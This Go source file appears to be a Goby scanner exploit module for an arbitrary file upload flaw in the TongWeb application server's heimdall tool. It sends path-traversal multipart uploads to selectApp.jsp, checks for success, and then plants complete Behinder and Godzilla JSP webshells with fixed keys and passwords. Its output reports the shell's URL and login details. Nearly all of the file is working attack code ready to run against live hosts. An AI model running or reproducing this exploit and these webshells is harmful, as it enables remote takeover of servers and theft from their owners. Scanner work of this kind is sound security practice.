package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "TongWeb selectApp.jsp Arbitrary File Upload Vulnerability",
    "Description": "<p>TongWeb is an application server product that fully complies with the latest standards of Java EE and Jakarta EE, is lightweight and easy to use, has powerful performance, high reliability and high security.</p><p>TongWeb’s centralized management tool heimdall does not impose access restrictions on jsp files. There is an arbitrary file upload vulnerability in /pages/cla/selectApp.jsp, and attackers can upload malicious Trojan horses to obtain server permissions.</p>",
    "Product": "TongWeb-Server",
    "Homepage": "https://www.tongtech.com/",
    "DisclosureDate": "2023-02-28",
    "Author": "h1ei1",
    "FofaQuery": "header=\"TongWeb Server\" || banner=\"Server: TongWeb Server\"",
    "GobyQuery": "header=\"TongWeb Server\" || banner=\"Server: TongWeb Server\"",
    "Level": "3",
    "Impact": "<p>TongWeb’s centralized management tool heimdall does not impose access restrictions on jsp files. There is an arbitrary file upload vulnerability in /pages/cla/selectApp.jsp, and attackers can upload malicious Trojan horses to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released security patches, please update in time: <a href=\"https://tongtech.com/.\">https://tongtech.com/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "wqueu285569.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "fileContent",
            "type": "input",
            "value": "<% out.println(\"pwned\"); %>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload",
        "Information technology application innovation industry"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "TongWeb selectApp.jsp 任意文件上传漏洞",
            "Product": "东方通-TongWeb",
            "Description": "<p>东方通-TongWeb是一款全面符合Java EE、Jakarta EE最新标准规范、轻量易于使用、性能强大、具有高可靠性和高安全性的应用服务器产品。</p><p>东方通-TongWeb 的集中管理工具 heimdall 并未对jsp文件做访问限制，其中 /pages/cla/selectApp.jsp 存在任意文件上传漏洞，攻击者可上传恶意木马获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布安全补丁，请及时更新：<a href=\"https://tongtech.com/\">https://tongtech.com/</a>。<br></p>",
            "Impact": "<p>东方通-TongWeb 的集中管理工具 heimdall 并未对jsp文件做访问限制，其中 /pages/cla/selectApp.jsp 存在任意文件上传漏洞，攻击者可上传恶意木马获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "信创"
            ]
        },
        "EN": {
            "Name": "TongWeb selectApp.jsp Arbitrary File Upload Vulnerability",
            "Product": "TongWeb-Server",
            "Description": "<p>TongWeb is an application server product that fully complies with the latest standards of Java EE and Jakarta EE, is lightweight and easy to use, has powerful performance, high reliability and high security.<br></p><p>TongWeb’s centralized management tool heimdall does not impose access restrictions on jsp files. There is an arbitrary file upload vulnerability in /pages/cla/selectApp.jsp, and attackers can upload malicious Trojan horses to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released security patches, please update in time: <a href=\"https://tongtech.com/.\">https://tongtech.com/.</a><br></p>",
            "Impact": "<p>TongWeb’s centralized management tool heimdall does not impose access restrictions on jsp files. There is an arbitrary file upload vulnerability in /pages/cla/selectApp.jsp, and attackers can upload malicious Trojan horses to obtain server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "Information technology application innovation industry"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10829"
}`

	sendPayloadFlagOh0Pi := func(hostInfo *httpclient.FixUrl, uri string, payload string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewPostRequestConfig(uri)
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=fa2ef860e94d564632e291131d20064c")
		payloadRequestConfig.Data = payload
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}
	getOh0Pi := func(hostInfo *httpclient.FixUrl, uriGet string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig(uriGet)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randName := goutils.RandomHexString(6)
			randPath := fmt.Sprintf("../../applications/heimdall/%s.jsp", randName)
			base64Name := base64.StdEncoding.EncodeToString([]byte(randPath))
			truePoc := fmt.Sprintf("--fa2ef860e94d564632e291131d20064c\r\nContent-Disposition: form-data; name=\"app_fileName\"\r\n\r\n%s\r\n--fa2ef860e94d564632e291131d20064c\r\nContent-Disposition: form-data; name=\"app\"\r\n\r\n\r\n--fa2ef860e94d564632e291131d20064c\r\nContent-Disposition: form-data; name=\"className\"\r\n\r\ntest\r\n--fa2ef860e94d564632e291131d20064c\r\nContent-Disposition: form-data; name=\"uploadApp\"; filename=\"test.jar\"\r\nContent-Type: application/java-archive\r\n\r\n<%% out.println(2688768+48446787); %%>\r\n--fa2ef860e94d564632e291131d20064c--\r\n", base64Name)
			if resp, err := sendPayloadFlagOh0Pi(hostInfo, "/heimdall/pages/cla/selectApp.jsp", truePoc); err == nil {
				uriGet := fmt.Sprintf("/heimdall/%s.jsp", randName)
				if resp, err = getOh0Pi(hostInfo, uriGet); err == nil {
					return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "51135555")
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			filename := goutils.B2S(ss.Params["filename"])
			fileContent := goutils.B2S(ss.Params["fileContent"])
			if attackType == "webshell" {
				webshell := goutils.B2S(ss.Params["webshell"])
				filename = goutils.RandomHexString(6)+".jsp"
				randPath := fmt.Sprintf("../../applications/heimdall/%s", filename)
				base64Name := base64.StdEncoding.EncodeToString([]byte(randPath))
				if webshell == "behinder" {
					fileContent = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					fileContent = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
				}
				if _, err := sendPayloadFlagOh0Pi(expResult.HostInfo, "/heimdall/pages/cla/selectApp.jsp", fmt.Sprintf("--fa2ef860e94d564632e291131d20064c\r\nContent-Disposition: form-data; name=\"app_fileName\"\r\n\r\n%s\r\n--fa2ef860e94d564632e291131d20064c\r\nContent-Disposition: form-data; name=\"app\"\r\n\r\n\r\n--fa2ef860e94d564632e291131d20064c\r\nContent-Disposition: form-data; name=\"className\"\r\n\r\ntest\r\n--fa2ef860e94d564632e291131d20064c\r\nContent-Disposition: form-data; name=\"uploadApp\"; filename=\"test.jar\"\r\nContent-Type: application/java-archive\r\n\r\n%s\r\n--fa2ef860e94d564632e291131d20064c--\r\n", base64Name, fileContent)); err == nil {
					expResult.Success = true
					expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/heimdall/" + filename + "\n"
					if attackType != "custom" && webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if attackType != "custom" && webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					} else {
						fmt.Println("no select")
					}
					expResult.Output += "Webshell type: jsp"
				}
			} else if attackType == "custom" {
				randPath := fmt.Sprintf("../../applications/heimdall/%s", filename)
				base64Name := base64.StdEncoding.EncodeToString([]byte(randPath))
				if _, err := sendPayloadFlagOh0Pi(expResult.HostInfo, "/heimdall/pages/cla/selectApp.jsp", fmt.Sprintf("--fa2ef860e94d564632e291131d20064c\r\nContent-Disposition: form-data; name=\"app_fileName\"\r\n\r\n%s\r\n--fa2ef860e94d564632e291131d20064c\r\nContent-Disposition: form-data; name=\"app\"\r\n\r\n\r\n--fa2ef860e94d564632e291131d20064c\r\nContent-Disposition: form-data; name=\"className\"\r\n\r\ntest\r\n--fa2ef860e94d564632e291131d20064c\r\nContent-Disposition: form-data; name=\"uploadApp\"; filename=\"test.jar\"\r\nContent-Type: application/java-archive\r\n\r\n%s\r\n--fa2ef860e94d564632e291131d20064c--\r\n", base64Name, fileContent)); err == nil {
					uri2 := fmt.Sprintf("/heimdall/%s", filename)
					expResult.Output = "文件地址: " + expResult.HostInfo.FixedHostInfo + uri2
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
